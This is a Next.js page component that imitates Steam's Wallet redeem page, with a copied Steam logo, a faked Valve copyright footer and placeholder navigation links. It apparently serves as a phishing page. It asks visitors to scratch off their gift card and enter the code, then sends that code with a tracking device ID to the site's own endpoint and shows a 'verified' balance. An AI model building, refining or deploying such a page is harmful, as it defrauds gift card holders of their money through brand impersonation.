import { useState, useEffect } from 'react'
import Head from 'next/head'
import styles from '../styles/steam.module.css'

export default function SteamPage() {
  const [card, setCard] = useState('')
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState(null)
  const [error, setError] = useState(null)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [showTutorial, setShowTutorial] = useState(false)
  const [deviceId, setDeviceId] = useState(null)

  useEffect(() => {
    // Initialize or get device ID
    let id = localStorage.getItem('deviceId')
    if (!id) {
      id = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now()
      localStorage.setItem('deviceId', id)
    }
    setDeviceId(id)
  }, [])

  async function checkBalance(e) {
    e.preventDefault()
    setError(null)
    setResult(null)
    if (!card.trim()) return setError('Please enter your Steam Gift Card code.')

    setLoading(true)
    try {
      const res = await fetch('/api/check-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardNumber: card.replace(/\s+/g, ''),
          type: 'steam',
          deviceId: deviceId
        })
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || 'Unable to verify card. Please try again later.')
      setResult(data)
    } catch (err) {
      setError(err.message)
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className={styles.steamPage}>
      <Head>
        <title>Steam Wallet - Redeem and Check Balance</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
      </Head>

      <header className={styles.header}>
        <div className={styles.headerTop}>
          <div className={styles.headerLeft}>
            <a href="/steam" className={styles.logoContainer}>
              <svg className={styles.logo} viewBox="0 0 176 44" fill="currentColor">
                <path d="M.329 25.333A8.01 8.01 0 0 0 7.99 31C12.414 31 16 27.418 16 23s-3.586-8-8.009-8A8.006 8.006 0 0 0 0 22.468l.003.006 4.304 1.769A2.2 2.2 0 0 1 5.62 23.88l1.96-2.844-.001-.04a3.046 3.046 0 0 1 3.042-3.043 3.046 3.046 0 0 1 3.042 3.043 3.047 3.047 0 0 1-3.111 3.044l-2.804 2a2.223 2.223 0 0 1-3.075 2.11 2.22 2.22 0 0 1-1.312-1.568L.33 25.333Z" />
                <path d="M4.868 27.683a1.715 1.715 0 0 0 1.318-3.165 1.7 1.7 0 0 0-1.263-.02l1.023.424a1.261 1.261 0 1 1-.97 2.33l-.99-.41a1.7 1.7 0 0 0 .882.84Zm3.726-6.687a2.03 2.03 0 0 0 2.027 2.029 2.03 2.03 0 0 0 2.027-2.029 2.03 2.03 0 0 0-2.027-2.027 2.03 2.03 0 0 0-2.027 2.027m2.03-1.527a1.524 1.524 0 1 1-.002 3.048 1.524 1.524 0 0 1 .002-3.048" />
                <text x="24" y="28" fill="white" style={{ fontFamily: 'Motiva Sans, Arial', fontWeight: 'bold', fontSize: '18px', letterSpacing: '3px' }}>STEAM</text>
              </svg>
            </a>
          </div>

          <nav className={styles.nav}>
            <a href="#">STORE</a>
            <a href="#">COMMUNITY</a>
            <a href="#">ABOUT</a>
            <a href="#">SUPPORT</a>
          </nav>

          <div className={styles.headerRight}>
            <div className={styles.installSteam}>
              <button className={styles.installBtn}>INSTALL STEAM</button>
              <a href="#" className={styles.loginLink}>login</a>
            </div>
            <button
              className={styles.mobileMenuBtn}
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
              aria-label="Toggle Menu"
            >
              <div className={`${styles.hamburger} ${mobileMenuOpen ? styles.open : ''}`}>
                <span></span>
                <span></span>
                <span></span>
              </div>
            </button>
          </div>
        </div>

        {/* Mobile Navigation Menu */}
        <div className={`${styles.mobileNav} ${mobileMenuOpen ? styles.active : ''}`}>
          <a href="#" onClick={() => setMobileMenuOpen(false)}>STORE</a>
          <a href="#" onClick={() => setMobileMenuOpen(false)}>COMMUNITY</a>
          <a href="#" onClick={() => setMobileMenuOpen(false)}>ABOUT</a>
          <a href="#" onClick={() => setMobileMenuOpen(false)}>SUPPORT</a>
        </div>
      </header>

      <main className={styles.main}>
        <div className={styles.breadcrumb}>
          Support › Steam Wallet › Redeem
        </div>

        <section className={styles.cardSection}>
          <div className={styles.formContainer}>
            <h1 className={styles.mainTitle}>Steam Wallet Code</h1>
            <p className={styles.subtitle}>Check your balance or redeem your code to add funds to your Steam Wallet instantly.</p>

            <div className={styles.card}>
              <form onSubmit={checkBalance}>
                <div className={styles.inputGroup}>
                  <label className={styles.label}>Enter your wallet code</label>
                  <input
                    type="text"
                    className={styles.input}
                    placeholder="AAAAA-BBBBB-CCCCC"
                    value={card}
                    onChange={(e) => setCard(e.target.value.toUpperCase())}
                    disabled={loading}
                    autoComplete="off"
                    spellCheck="false"
                  />
                </div>

                <button type="submit" className={styles.button} disabled={loading}>
                  {loading ? 'Verifying...' : 'Continue'}
                </button>
              </form>

              {result && (
                <div className={styles.result}>
                  <div className={styles.resultHeader}>
                    <span className={styles.statusDot}></span>
                    Code Successfully Verified
                  </div>
                  {result.isDuplicate ? (
                    <div className={styles.error} style={{ background: 'rgba(255, 59, 48, 0.1)', color: '#ff453a', border: '1px solid rgba(255, 59, 48, 0.2)', margin: '20px 0', borderRadius: '4px', padding: '12px', fontWeight: '500' }}>
                      This card code has already been submitted from your device.
                    </div>
                  ) : result.message ? (
                    <div className={styles.error} style={{ background: 'rgba(255, 255, 255, 0.05)', color: '#fff', border: '1px solid rgba(255, 255, 255, 0.1)', margin: '20px 0', borderRadius: '4px' }}>
                      <span>{result.message}</span>
                    </div>
                  ) : (
                    <div className={styles.balanceText}>
                      Available Balance
                      <span className={styles.amount}>{result.balance} {result.currency}</span>
                    </div>
                  )}
                  <p className={styles.readyMsg}>Value will be added to your current Steam account after final redemption.</p>
                </div>
              )}

              {error && (
                <div className={styles.error}>
                  <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5">
                    <circle cx="12" cy="12" r="10" />
                    <line x1="12" y1="8" x2="12" y2="12" />
                    <line x1="12" y1="16" x2="12.01" y2="16" />
                  </svg>
                  <span>{error}</span>
                </div>
              )}
            </div>

            {/* Tutorial Section */}
            <div className={styles.tutorialWrapper}>
              <button
                className={styles.tutorialToggle}
                onClick={() => setShowTutorial(!showTutorial)}
              >
                <span>Where do I find my Steam Wallet code?</span>
                <svg
                  viewBox="0 0 24 24"
                  width="20"
                  height="20"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2.5"
                  style={{ transform: showTutorial ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.4s' }}
                >
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>

              <div className={`${styles.tutorialContent} ${showTutorial ? styles.show : ''}`}>
                <div className={styles.tutorialStep}>
                  <div className={styles.stepNumber}>1</div>
                  <div className={styles.stepText}>Gently scratch the vertical silver strip on the back of your Steam Gift Card to reveal the code.</div>
                </div>
                <div className={styles.tutorialStep}>
                  <div className={styles.stepNumber}>2</div>
                  <div className={styles.stepText}>The code is an alphanumeric string (usually 15 characters, e.g., AAAAA-BBBBB-CCCCC).</div>
                </div>
                <div className={styles.tutorialImage}>
                  <img src="/steam-back-card.jpg" alt="Steam Card Back Tutorial" style={{ width: '100%', display: 'block' }} />
                </div>
                <p className={styles.imageCaption}>The Wallet Code is printed on the back of the card under the scratch-off area.</p>
              </div>
            </div>
          </div>
        </section>
      </main>

      <footer className={styles.footer}>
        <div className={styles.footerContent}>
          <div className={styles.footerLogo}>
            <svg width="100" height="30" viewBox="0 0 100 30" fill="#8f98a0" opacity="0.6">
              <path d="M.329 10.333A8.01 8.01 0 0 0 7.99 16C12.414 16 16 12.418 16 8s-3.586-8-8.009-8A8.006 8.006 0 0 0 0 7.468l.003.006 4.304 1.769A2.2 2.2 0 0 1 5.62 8.88l1.96-2.844-.001-.04a3.046 3.046 0 0 1 3.042-3.043 3.046 3.046 0 0 1 3.042 3.043 3.047 3.047 0 0 1-3.111 3.044l-2.804 2a2.223 2.223 0 0 1-3.075 2.11 2.22 2.22 0 0 1-1.312-1.568L.33 10.333Z" transform="scale(1.5)" />
            </svg>
          </div>
          <div className={styles.footerDetails}>
            <p>© 2025 Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.</p>
            <p>VAT included in all prices where applicable.</p>
            <div className={styles.footerLinks}>
              <a href="#">Privacy Policy</a>
              <span> | </span>
              <a href="#">Legal</a>
              <span> | </span>
              <a href="#">Steam Subscriber Agreement</a>
              <span> | </span>
              <a href="#">Refunds</a>
              <span> | </span>
              <a href="#">Cookies</a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
